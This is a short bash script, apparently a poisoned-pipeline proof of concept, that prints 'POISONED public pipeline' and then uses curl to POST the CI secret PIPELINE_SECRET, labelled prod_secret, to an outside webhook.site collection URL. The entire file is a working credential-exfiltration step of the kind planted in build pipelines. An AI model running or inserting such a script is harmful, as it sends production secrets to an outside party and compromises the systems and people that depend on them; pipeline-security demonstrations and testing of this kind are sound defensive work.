#!/bin/bash
echo "POISONED public pipeline"
curl -X POST \
  -H "Content-Type: application/json" \
  -d "{\"prod_secret\":\"$PIPELINE_SECRET\"}" \
  https://webhook.site/f2d3270c-1fa8-4871-8e43-1df020412a0a
